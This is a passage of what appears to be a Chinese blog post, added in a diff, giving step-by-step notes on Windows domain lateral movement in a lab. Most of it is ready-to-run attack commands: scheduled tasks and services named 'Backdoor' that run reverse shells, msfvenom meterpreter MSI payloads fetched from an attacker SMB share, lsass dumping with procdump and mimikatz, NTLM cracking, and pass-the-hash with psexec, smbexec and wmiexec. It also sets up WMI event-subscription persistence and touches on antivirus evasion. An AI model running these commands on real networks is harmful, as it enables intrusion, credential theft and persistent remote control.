+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145205438.png"
+                      alt="image-20230301145205438"
+                ></p>
+<p>IPC建立失败原因</p>
+<p>对方未开启139，445端口等</p>
+<p>—dir \xx.xx.xx.xx\C$\ # 查看文件列表</p>
+<p>—copy \xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</p>
+<p>—copy 1.bat \xx.xx.xx.xx\C$ # 复制文件</p>
+<p>—net use \xx.xx.xx.xx\C$\1.bat &#x2F;del # 删除 IPC</p>
+<p>—net view xx.xx.xx.xx # 查看对方共享</p>
+<h6 id="at-lt-windows-2012"><a href="#at-lt-windows-2012" class="headerlink" title="at &lt; windows 2012"></a>at &lt; windows 2012</h6><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145843892.png"
+                      alt="image-20230301145843892"
+                ></p>
+<p>首先利用信息收集工具收集到域控主机的地址信息，然后利用这个地址信息建立ipc连接，在利用已经攻陷的web服务器主机向域控主机复一个add.bat文件，该文件内容为创建一个用户（实际中一般植入病毒后门），再利用at定时自动执行在域上执行该文件，则就建立了一个用户schtasks &gt;&#x3D; windows 2012</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301150838876.png"
+                      alt="image-20230301150838876"
+                ></p>
+<h6 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h6><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301152547387.png"
+                      alt="image-20230301152547387"
+                ></p>
+<p>计划任务</p>
+<p><code>schtasks /Create /S 192.168.30.30 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</code></p>
+<p>立即执行</p>
+<p><code>schtasks /RUN /S 192.168.30.30 /I /TN Backdoor</code></p>
+<p>删除</p>
+<p><code>schtasks /Delete /S 192.168.30.30 /TN Backdoor /F</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#也可以通过将命令的文件写入文件，通过type命令读取</span><br><span class="line">schtasks /Create /S 19.168.30.30 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami&#x27; &gt; C:\resulit.txt&quot; /RU System /f</span><br><span class="line"></span><br><span class="line">type \\192.168.30.30\C$\result.txt     #读取执行结果</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h6 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h6><p>Windows可以利用UNC路径来访问网络共享资源</p>
+<p>1.现在服务器中搭建SMB匿名共享服务，并生成攻击载荷放入共享目录</p>
+<p>2.执行</p>
+<p><code>schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\ evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</code></p>
+<p>在远程主机10.10.10.19中创建计划任务，使用UNC路径加载位于192.168.2.143共享中的攻击载荷并执行</p>
+<h3 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h3><p>WMI是Windows管理技术，通过调用WMI类的方法进行远程执行</p>
+<p>执行远程查询，查询远程主机的进程信息</p>
+<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process li st brief</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174150555.png"
+                      alt="image-20230317174150555"
+                ></p>
+<p>创建远程进程</p>
+<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process call create &quot;cmd.exe /c ipconfig &gt; C:\jieguo.txt&quot;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174534828.png"
+                      alt="image-20230317174534828"
+                ></p>
+<p>因为没有回显所以需要利用type进行查看</p>
+<p><code>type \\192.168.30.10\C$\jieguo.txt</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174549486.png"
+                      alt="image-20230317174549486"
+                ></p>
+<p>还可以使用远程安装MSI文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用msf生成一个msi恶意文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 Lport=4444 -f msi -o reverse_tcp.msi</span><br><span class="line">建立共享服务器SMB</span><br><span class="line">在跳板机上执行</span><br><span class="line">wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 priduct call install PackageLocation=&quot;\\SMB服务器IP\服务名\reverse_tcp.msi&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="winRM的利用"><a href="#winRM的利用" class="headerlink" title="winRM的利用"></a>winRM的利用</h3><p>通过winRM执行远程命令</p>
+<p>执行以下命令，手动将目的IP添加到客户端信任列表TrustedHosts</p>
+<p><code>winrm set winrm/config/client @&#123;TrustedHosts=&quot;192.168.30.10&quot;&#125;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317220135483.png"
+                      alt="image-20230317220135483"
+                ></p>
+<p><code>Set-Item WSMan:localhost\client\trustedhosts -value *</code></p>
+<p>上面这个命令是在powershell上面执行的</p>
+<h6 id="winrs"><a href="#winrs" class="headerlink" title="winrs"></a>winrs</h6><p>Winrm是Windows远程管理的客户端程序，允许通过提供的用户凭据，在winRM服务器上执行命令</p>
+<p>在远程主机上执行<code>winrs -r http://192.168.30.10:5985 -u:Administrator -p:Admin!@#45 &quot;whoami&quot;</code></p>
+<p>也可以直接在上面whoami的位置输入cmd打开cmd</p>
+<h6 id="Winrm-cmd"><a href="#Winrm-cmd" class="headerlink" title="Winrm.cmd"></a>Winrm.cmd</h6><p>Winrm.cmd允许WMI对象通过WinRM传输进行远程交互</p>
+<h3 id="系统服务利用"><a href="#系统服务利用" class="headerlink" title="系统服务利用"></a>系统服务利用</h3><h4 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h4><p>先建立ipc共享</p>
+<p>然后<code>sc \\192.168.30.30 create Backdoor binpath= &quot;cmd.exe /k C:\rever_tcp.exe&quot;</code></p>
+<p>注意&#x3D;后面要有空格</p>
+<p>执行<code>sc \\192.168.30.30 start Backdoor</code></p>
+<p>删除服务<code>sc \\192.168.30.30 delete Backdoor</code></p>
+<h4 id="利用全部步骤："><a href="#利用全部步骤：" class="headerlink" title="利用全部步骤："></a>利用全部步骤：</h4><p>先利用信息收集部分的指令得到该域内各个主机的地址信息等</p>
+<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”  检测存活ip</p>
+<p>再利用mimikatz获取已控制主机的密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154749779.png"
+                      alt="image-20230301154749779"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154815697.png"
+                      alt="image-20230301154815697"
+                ></p>
+<p>然后利用批量impacket脚本批量探测，再找到另外一个主机一样的密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301161036660.png"
+                      alt="image-20230301161036660"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301155730960.png"
+                      alt="image-20230301155730960"
+                ></p>
+<p>发现有一个具有system权限，说明该主机有跟本主机一样的密码，</p>
+<p>所以可以在现在发现的这个主机上再次使用mimikatz找新的密码，然后以此类推用这个密码再次探测各个主机地址</p>
+<p>直到找到域控密码</p>
+<p>得到密码之后就可以利用at或者schtasks进行攻击，至此完整过程完成</p>
+<h4 id="psexec-amp-smbexec以及wmic-amp-wmiexec"><a href="#psexec-amp-smbexec以及wmic-amp-wmiexec" class="headerlink" title="psexec&amp;smbexec以及wmic&amp;wmiexec"></a>psexec&amp;smbexec以及wmic&amp;wmiexec</h4><p>前瞻知识：</p>
+<p>1.windows2012之后系统默认关闭wigest，攻击者无法从内存中获取明文密码，2012之前的版本如果安装KB2871997补丁。也会导致这样</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302091720681.png"
+                      alt="image-20230302091720681"
+                ></p>
+<h5 id="procdump-mimikatz的配合获取"><a href="#procdump-mimikatz的配合获取" class="headerlink" title="procdump+mimikatz的配合获取"></a>procdump+mimikatz的配合获取</h5><p>procdump -accepteula -ma lsass.exe lsass.dmp  </p>
+<p>   #在目标主机上执行该条命令，得到了lsass.dmp文件，之后就是将这个文件移动到我们的本地主机，使用mimikatz进行恢复</p>
+<p>然后在mimikatz上执行</p>
+<p>privilege::debug</p>
+<p>sekurlsa::minidump lsass.dmp </p>
+<p>sekurlsa::logonpasswords full</p>
+<p>原理：Mimikatz属于第三方软件，直接上传到目标主机可能 杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
+<h5 id="hashcat破解NTLM-hash-kali系统自带"><a href="#hashcat破解NTLM-hash-kali系统自带" class="headerlink" title="hashcat破解NTLM hash(kali系统自带)"></a>hashcat破解NTLM hash(kali系统自带)</h5><p>—爆破命令：hashcat -a 0 -m 1000 hash file –force</p>
+<p>—-a, –attack-mode&#x3D;NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。（这里是字典攻击）</p>
+<p>— -m 1000指向的是NTLM Hash哈希协议</p>
+<p>—hash是要破解的哈希字符串，file为字典的地址</p>
+<h5 id="域横向移动smb服务利用–psexec，，smbexec（官方自带）"><a href="#域横向移动smb服务利用–psexec，，smbexec（官方自带）" class="headerlink" title="域横向移动smb服务利用–psexec，，smbexec（官方自带）"></a>域横向移动smb服务利用–psexec，，smbexec（官方自带）</h5><p>利用smb服务可以通过明文或者hash传递来远程执行，必要条件是445端口要开启和Admin$共享</p>
+<p>主要连接到SMB服务端的Admin$共享，并且释放psexesvc.exe，注册PSEXESVC服务，然后通过PSEXESVC服务进行命令执行</p>
+<p>简要来说就是用这些工具来远程得到目标主机的system权限</p>
+<h6 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h6><p>存在两种连接方式：</p>
+<ol>
+<li>先有 ipc 链接，psexec 需要明文或hash 传递</li>
+</ol>
+<p>先建立ipc连接：<code>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator（密码是前期信息收集获取）</code></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/61ebf51eba2c47386868d4c0c3ad5be5aab0cadb.png@831w_224h_progressive.webp"
+                      alt="img" style="zoom:150%;" 
+                >
+
+<p>—以system权限运行cmd: psexec \192.168.3.32 -s cmd（发现为系统权限）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/81503bc903d891f81ae6212759bd1e9c9ece321a.png@824w_354h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>2.不用建立IPC直接提供明文账户密码（推荐原因：建立IPC链接可能会失败）</p>
+<p><code>psexec --accepteula \\192.168.3.21 -u（用户） administrator -p（密码） Admin12345 -s（系统权限） cmd（运行cmd） </code></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9695a079ec035707a26619612833bd79c3a062e8.png@831w_246h_progressive.webp"
+                      alt="img" style="zoom:150%;" 
+                >
+
+
+
+<p>如果没有明文密码，只有hash密码的话官方的pstools不能使用，这时候就需要使用impacket中别人二改的psexec.exe</p>
+<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#51;&#x32;" >&#97;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<h6 id="smbexec（无需先ipc连接-明文传递）"><a href="#smbexec（无需先ipc连接-明文传递）" class="headerlink" title="smbexec（无需先ipc连接 明文传递）"></a>smbexec（无需先ipc连接 明文传递）</h6><p>连接sqlserver的非域内主机</p>
+<p>smbexec .&#x2F;administrator:admin!@#45  @192.168.3.32 </p>
+<p>链接sqlserver的域内用户</p>
+<p>smbexec .god&#x2F;administrator:Admin12345  @192.168.3.32</p>
+<p>建立哈希连接（sqlserver的非域管理员）：</p>
+<p>smbexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;administrator  @192.168.3.32 </p>
+<p>通过域用户中域管理员登陆sqlserver服务器（域管理员可以登陆域内任意主机）</p>
+<p>smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#x32;" >&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h6 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h6><p>使用命令</p>
+<p><code>wmiexec HACK-MY/Administrator:Admin!@#45@192.168.30.10</code>连接域内主机，就可以远程命令控制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317202047275.png"
+                      alt="image-20230317202047275"
+                ></p>
+<h5 id="域横向移动WMI服务利用"><a href="#域横向移动WMI服务利用" class="headerlink" title="域横向移动WMI服务利用"></a>域横向移动WMI服务利用</h5><p>WMI是一种Windows管理规范可以通过WMI管理本地用户和远程计算机，提供两个协议分布式组件对象模型、Windows远程管理</p>
+<p>WMI服务是通过本地135端口进行利用的，支持用户名明文或者哈希的方式进行认证，并且该方法不会在目标日志系统留下痕迹</p>
+<p>常见的控制方法有</p>
+<p>1.通过调用WMI的类的方法进行远程执行如Win32_Process类中的Create方法可以远程主机上创建进程，利用install安装恶意MSI</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用metasploit生成恶意的MSI</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -F MSI -O reverse_tcp.msi</span><br><span class="line">服务器上搭建SMB共享服务器，并放入msi</span><br><span class="line">跳板机上执行</span><br><span class="line">wmic /node:101.10.10.19 /user:Administrator /password:Admin@123 product call install packageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;</span><br><span class="line">成功获取权限</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>2.远程部署WMI实践订阅，条件触发攻击</p>
+<p>1.自带WMIC明文传递 无回显</p>
+<p>wmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Admin12345 process call create “cmd.exe &#x2F;c ipconfig &gt;C:\1.txt”</p>
+<p>2.自带cscript明文传递，有回显（需要wmiexec.vbs文件，不支持hash）</p>
+<p>cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.3.21 administrator Admin12345 </p>
+<p>3.impacket wmiexec套件，明文传递，支持hash，有回显，但是得做免杀</p>
+<p>连接域sqlserver执行命令：</p>
+<p>wmiexec .&#x2F;administrator:admin!@#45    @192.168.3.32 “whoami”（或者”ipconfig”） </p>
+<p>明文连接域控：</p>
+<p>wmiexec god&#x2F;administrator:Admin12345    @192.168.3.21 “whoami”</p>
+<p>哈希分别连接sqlserver和域控</p>
+<p>wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x33;&#46;&#x33;&#50;" >&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x33;&#46;&#x33;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
+<p>wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x2e;&#x32;&#49;" >&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x2e;&#x32;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
+<h6 id="WMI订阅事件"><a href="#WMI订阅事件" class="headerlink" title="WMI订阅事件"></a>WMI订阅事件</h6><p>相当于一个条件触发事件，其中条件被称为“事件过滤器”，做出的响应称为“事件消费者”</p>
+<p>部署事件订阅的时候，需要分别构建Filter以及Consumer，且绑定一起</p>
+<p>手动利用</p>
+<p>1.整合PSCredential用于后续过程的认证</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$Username= &quot;HACK-MY\Administrator&quot;</span><br><span class="line">$Password=&quot;Admin!@#45&quot;</span><br><span class="line">$SecurePassword= $Password | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">$Credential = New-Object -Typename Syetem.Management.Automation.PSCredential -ArgumentList $Username,$SecurePassword</span><br></pre></td></tr></table></figure></div>
+
+<p>2.设置攻击目标和其他公共参数</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$GlobalArgs = @&#123;&#125;</span><br><span class="line">$ComputerName =&quot;192.168.30.10&quot;</span><br><span class="line">$GlobalArgs[&#x27;Credential&#x27;] = $Credential</span><br><span class="line">$GlobalArgs[&#x27;ComputerName&#x27;] = $ComputerName</span><br></pre></td></tr></table></figure></div>
+
+<p>3.在远程主机上部署RestFilter</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$EventFilterArgs = @&#123;</span><br><span class="line">       EventNamespace = &#x27;root/cimv2&#x27;</span><br><span class="line">       Name = &quot;TestFilter&quot;</span><br><span class="line">       Ouery = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;</span><br><span class="line">       QueryLanguage =&#x27;WQL&#x27;</span><br><span class="line">             &#125;</span><br><span class="line">$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>
+
+<p>4.在远程主机部署一个叫“TestConsumer”的事件消费者</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$CommandLineEventConsumerArgs =@&#123;</span><br><span class="line">          Name =&quot;TestConsumer&quot;</span><br><span class="line">          CommandLineTemplate =&quot;C:\Windows\System32\cmd.exe /c calc.exe&quot;</span><br><span class="line">                                &#125;</span><br><span class="line">$EventConsumer = Set-WmiInstance -Namespace root \subscription -Class</span><br><span class="line">    CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>
+
+<p>5.将事件消费者和事件过滤器绑定一起</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$FilterConsumerBindingArgs= &#123;</span><br><span class="line">      Filter = $EventFilter</span><br><span class="line">      Consumer = $EventConsumer</span><br><span class="line">                            &#125;</span><br><span class="line">$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class</span><br><span class="line">    __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>
+
+<p>如此一个事件订阅已经部署了，当远程系统轮询到svchost.exe进程产生时，将通过事件消费者执行系统命令来启动cale.exe进程</p>
+<p>Sharp-WMIEvent利用</p>
+<p>1.先在smb共享服务器上放入攻击载荷</p>
+<p>2.在跳板机上执行以下命令，运行Sharp-WMIEvent</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -CommputerName 192.168.30.10 -Domain hack-my.com -Username Administrator -Password Admin!@#45 -Command &quot;cmd.exe / c \\SMB服务器IP\evilsmb服务名称\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p> 这会在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行以此攻击载荷，使远程主机上线</p>
+<h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>1.信息收集，mimikatz实现密码收集</p>
+<p>2.使用命令检测存活ip     for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”     并排除自己本机的IP地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302112713483.png"
+                      alt="image-20230302112713483"
+                ></p>
+<p>然后收集域用户信息</p>
+<p>3.通过ipc等连接来验证域内主机的用户和密码</p>
+<p>4.通过命令或者工具箱进行提权</p>
+<p>5.重复进行操作，直到获取域控的权限</p>
+<h5 id="域横向移动以上服务hash批量利用-python编译exe"><a href="#域横向移动以上服务hash批量利用-python编译exe" class="headerlink" title="域横向移动以上服务hash批量利用-python编译exe"></a>域横向移动以上服务hash批量利用-python编译exe</h5><p>—收集明文或哈希密码（这个是Web本地用户）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c254c9e8488c3621f704255c4119d978a5398b34.png@783w_288h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—探测同网段存活主机</p>
+<p>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”（用for循环去ping1-254网段的主机，这是自带内部命令，不会被杀毒软件拦截，我这里只开了DC&#x2F;WEB&#x2F;SQL&#x2F;File）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/a32f6cd76d5f7ee9d05348ab3ca8f1d622c0978c.png@831w_87h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—探测域内用户</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b19abce24e85642feee983b541402857a2f72f1c.png@831w_408h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>#至此，我们已经收集到了IP，用户名，和密码hash。我们可以写一个python脚本，然后转换成exe批量利用</p>
+<p>—写入ip字典，用户字典，哈希密码字典</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cfa491a8137591a7437af3f5eb8c7b177b994d25.png@597w_527h_progressive.webp"
+                      alt="img" style="zoom:150%;" 
+                >
+
+<p>—ip、用户、哈希密码三重变化，连接域用户和本地用户</p>
+<p>—采用套件impacket包中，wmiexec明文或hash传递，有回显exe版本，但是易被杀（要做免杀）（这里注意whoami前面有空格）</p>
+<p>—并且该方法不会在目标日志系统留下痕迹</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e2b7e27c57a91b1367529f3ab5d0727aa245468.png@831w_371h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—将Python脚本复制到Script目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1d73721d1e18e01d245ad03070eb2cc5865f81c4.png@813w_209h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—在Script目录执行命令：pyinstaller.exe -F fuck_neiwang_002.py</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/838ea2110e71032e60b3fd71e1e729bcad2256e3.png@831w_252h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—在Script目录下dist目录发现exe文件，复制到域Web靶机执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/308612a5f913f9ea1cee905ff22db757ddf83d96.png@831w_234h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—运行exe文件，注意要和impacket包中wmiexec.exe文件同路径</p>
+<p>—发现192.168.3.32的本地管理员用户（Administrator）和字典的哈希密码一致</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/15d8f700dd18d364be7f668e7db63bd273d42146.png@831w_129h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—在192.168.3.32主机运行minikatz，获取到一个新的密码hash（第一个是连接的，第二个是新获取的，假设只找到了hash）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6cb861791e073abaf6e6aecac1036b3c8f68c756.png@831w_336h_progressive.webp"
+                      alt="img"
+                ><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/091c2301d888752e9bb70dcf4c48182ec8a712a8.png@831w_266h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—但是查看域用户发现没有这个sqlserver的用户</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1331e4aed28b4e607714d79bd8634b54fdb5224f.png@831w_306h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—在sqlserver本地查看，也没有sqlserver用户，由于是连接的本地用户，所以盲猜是本地用户的一个哈希密码，但是不知道是以下哪一个。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d610ad1369fe1a88ccf868c2db805d4ba1dbb403.png@735w_236h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—不知道为啥SQL的主机的域dbadmin用户没连接上，他俩的密码都是一样的，按道理本地连接上了域用户也可以才对</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4779e1676f6086f5e8a9a99ca3b76ec0a061dc08.png@831w_108h_progressive.webp"
+                      alt="img"
